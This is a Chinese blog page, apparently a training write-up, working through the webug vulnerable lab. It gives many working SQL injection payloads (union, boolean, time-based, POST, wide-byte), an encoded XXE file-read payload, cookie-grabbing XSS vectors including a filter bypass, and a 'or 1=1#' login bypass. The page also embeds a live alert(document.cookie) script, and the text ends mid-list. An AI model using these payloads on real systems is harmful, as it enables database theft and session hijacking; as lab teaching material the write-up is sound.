@@ -1,0 +1,441 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>webug靶场 | Flyme</title>
+  <meta name="author" content="西伯利亚狼">
+  
+  <meta name="description" content="奋斗小青年的逆袭之路一直进行中">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="webug靶场"/>
+  <meta property="og:site_name" content="Flyme"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Flyme" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Flyme</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> webug靶场</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1 SQL注入"></a>1 SQL注入</h1><a id="more"></a>
+
+<p><strong>查库信息</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># mysql</span><br><span class="line"></span><br><span class="line">select schema_name frome information_schema.schemata;</span><br><span class="line">select table_name from information_schema.tables where table_schema &#x3D; &quot;库名&quot;;</span><br><span class="line">select column_name from information_schema.colums where table_name &#x3D; &quot;表名&quot;;</span><br><span class="line">select 列名 from 库名.表名;</span><br><span class="line"></span><br><span class="line">select * from user order by 2;   &#x2F;&#x2F;表示按照第二列进行排序</span><br></pre></td></tr></table></figure>
+
+<p><strong>order by 用法</strong></p>
+<p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200518114506666.png" alt="image-20200518114506666"></p>
+<p>使用 order by 4的时候出现了错误，这样一来我们知道了有多少列的信息了</p>
+<p><strong>union 联合查询</strong></p>
+<p>##1 显错注入</p>
+<p>注释：<code>--+、-- （有一个空格）、#（推荐使用）   </code>前面两个由于传参问题可能有问题的</p>
+<p>group_concat（）函数</p>
+<p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200518123301882.png" alt="image-20200518123301882"><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200518123318366.png" alt="image-20200518123318366"></p>
+<ol>
+<li><pre><code>http://192.168.1.178/control/sqlinject/manifest_error.php?id=1 打开之后的链接
+http://192.168.1.178/control/sqlinject/mhanifest_error.pp?id=1 ‘  发生报错
+3http://192.168.1.178/control/sqlinject/manifest_error.php?id=1’--+ 根据提示，此时我们得到注入点
+http://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ order by 2--+ 使用order by 语句得知，一共存在两列。
+http://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ union select 1,2--+ 我们发现网页中，2被显示了出来。
+http://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ union select 1, group_concat(schema_name) from information_schema.schemata--+  查库==》information_schema,mysql,performance_schema,test,webug,webug_sys,webug_width_byte
+http://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ union select 1, database()--+查询当前使用的数据库==》webug
+
+http://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’webug‘ --+ 查询webug库下的所有表：==》data_crud,env_list,env_path,flag,sqlinjection,user,user_test
+http://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ union select 1,group_concat(column_name) from information_schema.columns where table_name=’flag‘ --+ 查看flag表中的列  ==》id,flag
+http://192.168.1.178/control/sqlinject/manifest_error.php?id=1‘ union select 1,flag from webug.flag --+ 查询flag的字段值==》dfafdasfafdsadfa
+
+&lt;!--hexoPostRenderEscape:&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;## 2 知识点补充&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;:hexoPostRenderEscape--&gt;
+if()函数
+if(A&gt;B,C,D);
+解释： 如果 A&gt;B 成立，则返回 C，否则返回 D；
+例： select if(1&gt;2,3,4);
+
+</code></pre>
+</li>
+</ol>
+<p>length();  显示长度<br>例：select length(database())&gt;1;<br>结合使用：<br>select if((length(database())&gt;1),1,sleep(5));<br>如果当前的数据库长度大于1，则返回1，否则睡眠5s；<br>select if((select length(schema_name) from information_schema.schemata limit 0,1)&gt;1,1,sleep(5));</p>
+<p>left()函数<br>left(A,num)=B   A的前num位是不是B？<br>例子：<br>Select left(database(),1) &gt; ’a’ ; 判断当前数据库的第一位是否比a大<br>同理： Select left(database(),2) &gt; ’sa’ ;  此时应该已经判断出了第一位，可以用这种方法判断第二位 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 3  布尔盲注</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;mysql</span><br><span class="line">http:&#x2F;&#x2F;192.168.1.178&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1显示正常</span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘显示不完整，但是没有报错信息产生</span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1’--+ 显示正常，根据提示，得到注入点</span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ order by 2--+ 此时显示正常，说明存在两列（其实这个在本节中没有意义）</span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  if((length(database())&gt;2),1,sleep(5))--+ 通过慢慢测试到当前的数据库名字长度为5.</span><br><span class="line"></span><br><span class="line"># 对于布尔注如来说，存在一定的缺陷：1、慢  2、不安全；故而推荐DNSlog注入</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  if((select length(schema_name) from information_schema.schemata limit 0,1)&gt;100,1,sleep(5))--+ 通过这个来查询数据库的长度，当然这个是每一个进行查询，在本节中我们查询的是当前的数据库，可以使用</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  if((select length(database()))&gt;2,1,sleep(5))--+这个是用来查询当前使用的数据库长度是多少的，最后知道这个数据库长度是5</span><br><span class="line"> </span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  left(database(),1) &gt; ’s’--+ 使用大于号可以用来判断，但是在正式使用的时候，我们可以使用burpsuite进行辅助判断，加快速度，最快的当然是使用脚本，本次视频暂不示范。</span><br><span class="line"></span><br><span class="line">注意： http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  left(database(),1) &gt; ’saaa’--+  请大家留意这个也是正确的，所以大家尽量使用一个字符来判断。</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  left((select schema_name from information_schema.schemata limit 0,1),1)&gt;’a’--+  这种使用limit的方法可以遍历所得数据库</span><br><span class="line"> </span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and  left((select table_name from information_schema.tables where table_schema&#x3D;’webug‘ limit 0,1),1)&gt;’a’--+  遍历里面的所有表</span><br><span class="line">剩下的就是遍历列名字，然后和字段的值，这个过程较为麻烦，可以使用脚本或sqlimap</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="4-延时注入"><a href="#4-延时注入" class="headerlink" title="4 延时注入"></a>4 延时注入</h2><p>判断长度：</p>
+<p>database（）</p>
+<p>length(database()):返回数据库长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ --+ 发现修改之后没有错误，找到注入点</span><br><span class="line"> </span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and 1&#x3D;1 --+ 再次验证我们找到注入点是正确的</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and if((length(database())&gt;1),1,sleep(5))--+ 和第二关相同的方法，判断此时的值，在使用大于和小于号的时候，适合手工判断，可以使用burpsuite配合等号进行快速长度判断。</span><br><span class="line"> </span><br><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;bool_injection.php?id&#x3D;1‘ and if(((select length(schema_name) from information_schema.schemata limit 0,1)&gt;1),1,sleep(5))--+ 也可通过这种方法进行一个一个数据库长度的判断，不过较慢。</span><br><span class="line"> 其余方法和第二关相同。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="5-POST-注入"><a href="#5-POST-注入" class="headerlink" title="5 POST 注入"></a>5 POST 注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">点击注册&#x2F;登录界面没有反应，看到存在一个搜索界面，我们直接输入’，此时产生报错信息： Invalid query: SELECT * FROM sqlinjection WHERE content &#x3D; ‘‘’ 即表示此界面存在注入漏洞。</span><br><span class="line"></span><br><span class="line">使用http—leader工具抓到post数据，也可以使用burpsuite抓取数据：存在post数据：keyWordName&#x3D;‘，此时我们可以开始构造。</span><br><span class="line">我们在hackbar的post中构造： keyWordName&#x3D;‘#(这里不能使用--+，使用--+是错误的)</span><br><span class="line"></span><br><span class="line">使用order by和union select1,2# 发现在页面中并未发现回显数据，这里我们使用盲注。</span><br><span class="line"></span><br><span class="line">keyWordName&#x3D;‘ and  length(database())&#x3D;1# 使用盲注之后，发现页面没有发生变化，我们改为时间盲注。</span><br><span class="line"></span><br><span class="line">keyWordName&#x3D;fadsfadfdasfasdfasfd‘ and  1&#x3D;2#   和 keyWordName&#x3D;fadsfadfdasfasdfasfd’ or 1&#x3D;2#返回均正常，说明了这里不能使用and语句。 理论上来说使用and的第一个语句是错误的，但是页面返回还是正常，说明做了处理，我们继续尝试</span><br><span class="line"></span><br><span class="line">使用sleep()   ——》 keyWordName&#x3D;fadsfadfdasfasdfasfd‘ or sleep(3)# 存在延迟， keyWordName&#x3D;fadsfadfdasfasdfasfd’ and  sleep(3)#没有延迟，接下来我们使用or来处理(注意这里是一个坑！！！)</span><br><span class="line"></span><br><span class="line"> keyWordName&#x3D;fadsfadfdasfasdfasfd‘ or if(length(database())&gt;1,1,sleep(5))# 通过返回信息来判断当前数据库长度，和less02基本相似</span><br><span class="line"> </span><br><span class="line">keyWordName&#x3D;fadsfadfdasfasdfasfd‘ or if(((select length(schema_name) from information_schema.schemata limit 0,1)&gt;1),1,sleep(5))# 也可通过这种遍历的方法判断所有的数据库。 速度较慢，推荐使用脚本。</span><br><span class="line"></span><br><span class="line">接下来的使用方法就是和以前相同了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="6-过滤注入"><a href="#6-过滤注入" class="headerlink" title="6 过滤注入"></a>6 过滤注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在搜索页面输入’ 点击搜索，发现了报错。 keyWordName&#x3D;&#39;</span><br><span class="line"></span><br><span class="line">keyWordName&#x3D;‘# 此时返回正常页面， keyWordName&#x3D;’ or sleep(3) # 存在延时</span><br><span class="line"></span><br><span class="line">keyWordName&#x3D;‘ or if(length(database())&gt;1,1,sleep(5))#  好像并没有进行过滤注入</span><br><span class="line"></span><br><span class="line">和第4关一样。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="7-宽字节"><a href="#7-宽字节" class="headerlink" title="7 宽字节"></a>7 宽字节</h2><p><strong>知识补充</strong></p>
+<p>参考文章： <a target="_blank" rel="noopener" href="https://blog.csdn.net/helloc0de/article/details/76180190">https://blog.csdn.net/helloc0de/article/details/76180190</a><br>                      <a target="_blank" rel="noopener" href="https://blog.csdn.net/heiseweiye/article/details/82723478">https://blog.csdn.net/heiseweiye/article/details/82723478</a><br>宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。    中文、韩文、日文等均存在宽字节，英文默认都是一个字节。</p>
+<p>在使用PHP连接MySQL的时候，当设置“set  character_set_client = gbk”时会导致一个<code>编码转换</code>的问题。<br>例子：   id= 1’       处理  1 \’       进行编码   1%5c%27         带入sql后  id = \’ and XXXX  此时无法完成注入<br>                id=1%df’  处理 1%df\’ 进行编码  1%df%5c%27   带入sql后  id =1運’ and XXX 此时存在宽字节注入漏洞</p>
+<p><strong>实战</strong></p>
+<p>常见使用：</p>
+<p><code>&#39;</code></p>
+<p><code>&quot;</code></p>
+<p><code>&#39;)</code></p>
+<p><code>&#39;))</code></p>
+<p><code>&quot;)</code></p>
+<p><code>&quot;))</code></p>
+<p>因为id 的where语句是这样的;<code>where id = () / &#39;&#39; / &quot;&quot; / (&#39;&#39;)</code>这些形式的 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1’ 此时返回正常，由题目知道是宽字节注入，所以直接引入%df’</span><br><span class="line"> </span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1%df’ 页面发生报错</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1%df‘ order by 2--+ 使用order by语句，发现存在两列   这里开始就和前面的第一关一模一样了</span><br><span class="line"></span><br><span class="line"> http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1%df‘ union select 1,2 --+ 发现2出现在页面中</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1%df‘ union select 1,database() --+ 查询当前的数据库为 webug_width_byte </span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1%df‘ union select 1,group_concat(schema_name) from information_schema.schemata --+或者使用这个，一次性取出所有的数据</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;sqlinject&#x2F;width_byte_injection.php?id&#x3D;1%df‘ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x77656275675f77696474685f62797465 --+(注意：这里不能直接使用where table_name&#x3D;’ webug_width_byte ’,因为单引号被转义掉了)</span><br><span class="line"></span><br><span class="line">————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200518175200031.png" alt="image-20200518175200031"></p>
+<h1 id="2-XXE注入漏洞-XML外部实体注入-XML-External-Entity"><a href="#2-XXE注入漏洞-XML外部实体注入-XML-External-Entity" class="headerlink" title="2 XXE注入漏洞(XML外部实体注入(XML External Entity))"></a>2 XXE注入漏洞(XML外部实体注入(XML External Entity))</h1><p>参考资料： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9302528.html">https://www.cnblogs.com/backlion/p/9302528.html</a><br>                       <a target="_blank" rel="noopener" href="https://blog.csdn.net/lvxiangan/article/details/80912870">https://blog.csdn.net/lvxiangan/article/details/80912870</a><br>                       <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/177979.html">https://www.freebuf.com/articles/web/177979.html</a><br>Xml定义： XML由3个部分构成，它们分别是：文档类型定义（Document Type Definition，DTD），即XML的布局语言；可扩展的样式语言（Extensible Style Language，XSL），即XML的样式表语言；以及可扩展链接语言（Extensible Link Language，XLL）。</p>
+<p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200518220310856.png" alt="image-20200518220310856"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们可以将 图片中的代码进行url编码，然后借助第七关构造数据：</span><br><span class="line">data= %3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%3f%3e%0a%3c%21%44%4f%43%54%59%50%45%20%41%4e%59%20%5b%0a%20%20%20%20%3c%21%45%4e%54%49%54%59%20%63%72%6f%77%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%43%3a%2f%70%68%70%53%74%75%64%79%2f%57%57%57%2f%2f%31%2e%74%78%74%22%3e%0a%5d%3e%0a%3c%6e%6f%74%65%3e%0a%20%20%20%20%3c%6e%61%6d%65%3e%26%63%72%6f%77%3b%3c%2f%6e%61%6d%65%3e%0a%3c%2f%6e%6f%74%65%3e%20</span><br><span class="line">这样我们就可以读取1.txt中的hello crow了</span><br><span class="line">由于不知道flag文件放在哪里，所以不再读取flag文件。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="3-CVS-漏洞"><a href="#3-CVS-漏洞" class="headerlink" title="3 CVS 漏洞"></a>3 CVS 漏洞</h1><p>参考资料： <a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/195656.html">https://www.freebuf.com/vuls/195656.html</a></p>
+<h1 id="4-XSS漏洞"><a href="#4-XSS漏洞" class="headerlink" title="4 XSS漏洞"></a>4 XSS漏洞</h1><p>xss(反射型)</p>
+<p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p>
+<p>反射型（非持久）：主要用于将恶意代码附加到URL地址的参数中，常用于窃取客户端cookie信息和钓鱼欺骗。</p>
+<p>存储型（持久型）：攻击者将恶意代码注入到Web服务器中并保存起来，只要客户端访问了相应的页面就会受到攻击。</p>
+<p>DOM型XSS：其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。DOM型的XSS实现都在前台执行</p>
+<p><strong>1 反射型xss</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;xss&#x2F;xss_1.php?id&#x3D;&lt;script&gt;alert(&#x2F;crow&#x2F;)&lt;&#x2F;script&gt;</span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;xss&#x2F;xss_1.php?id&#x3D;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>2 存储型xss</strong></p>
+<p>拉倒最后的留言板：</p>
+<script>alert(document.cookie)</script>
+<p><strong>3 DOM型xss</strong></p>
+<p>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。DOM型的XSS实现都在前台执行<br>具体讲解请自行百度！<br>首先在文本框里面随便输入，查看源代码：<br><input name="search" type="text" value="ABCDEFG" required><br>我们将其闭合：<br>“&gt;<script>alert(document.cookie)</script> 将其放在搜索框里即可！</p>
+<p><input name="search" type="text" value><script>alert(document.cookie)</script> “ required=””&gt;</p>
+<p><img src="/2020/07/15/webug%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200519115152029.png" alt="image-20200519115152029"></p>
+<p><strong>4 过滤XSS</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 直接使用上一节使用的函数：&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;  显示请不要包含恶意函数，考虑绕过</span><br><span class="line"></span><br><span class="line">2. &lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;   首先分解： &lt;script&gt;此时显示不要包含恶意函数，使用alert(1)，正常</span><br><span class="line"></span><br><span class="line">3. 尝试将script进行大小写，发现还是不行。</span><br><span class="line"></span><br><span class="line">4. 此时我们更换标签： &lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;，此时将里面的值更换即可！</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;xss&#x2F;filter_xss.php?id&#x3D;&lt;img src&#x3D;1 onerror&#x3D;alert(document.cookie)&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="5-万能密码"><a href="#5-万能密码" class="headerlink" title="5 万能密码"></a>5 万能密码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Sql语句： $sql &#x3D; &quot;SELECT * FROM user WHERE username &#x3D; &#39; &#39; AND password &#x3D; &#39; &#39; ;</span><br><span class="line">    常见的万能密码：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Downtime&#x2F;p&#x2F;7648182.html</span><br><span class="line">直接使用弱口令：  admin&#x2F;admin,admin&#x2F;admin888</span><br><span class="line">或者使用万能密码： ‘ or 1&#x3D;1#&#x2F;随意填写</span><br><span class="line">或者使用burpsuite尝试爆破</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="6-链接注入"><a href="#6-链接注入" class="headerlink" title="6 链接注入"></a>6 链接注入</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.136/control/xss/link_xss.php?id=1 点击页面，并未发生什么变化</span><br><span class="line">http://192.168.80.136/control/xss/link_xss.php?id=11222 在页面上找到了11222</span><br><span class="line">此时我们构造一个herf标签 <span class="tag">&lt;<span class="name">a</span>  <span class="attr">href</span>=<span class="string">https://www.baidu.com</span> &gt;</span>点我试试看<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="7-任意文件下载"><a href="#7-任意文件下载" class="headerlink" title="7 任意文件下载"></a>7 任意文件下载</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">任意文件下载： 可参考 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zhaijiahui&#x2F;p&#x2F;8459661.html</span><br><span class="line">任意文件下载：在很多提供文件下载的模块，由于缺乏对下载的文件的限制，攻击者可以通过绝对路径对其服务器内部的文件或配置文件等进行下载读取。</span><br><span class="line">漏洞一般存在于有下载功能的地方。</span><br><span class="line">我们可以配合burpsuite以及网站的报错绝对路径等信息进行尝试。</span><br><span class="line">可以使用goole或百度：</span><br><span class="line">     inurl: readfile.php?file&#x3D;</span><br><span class="line">    • 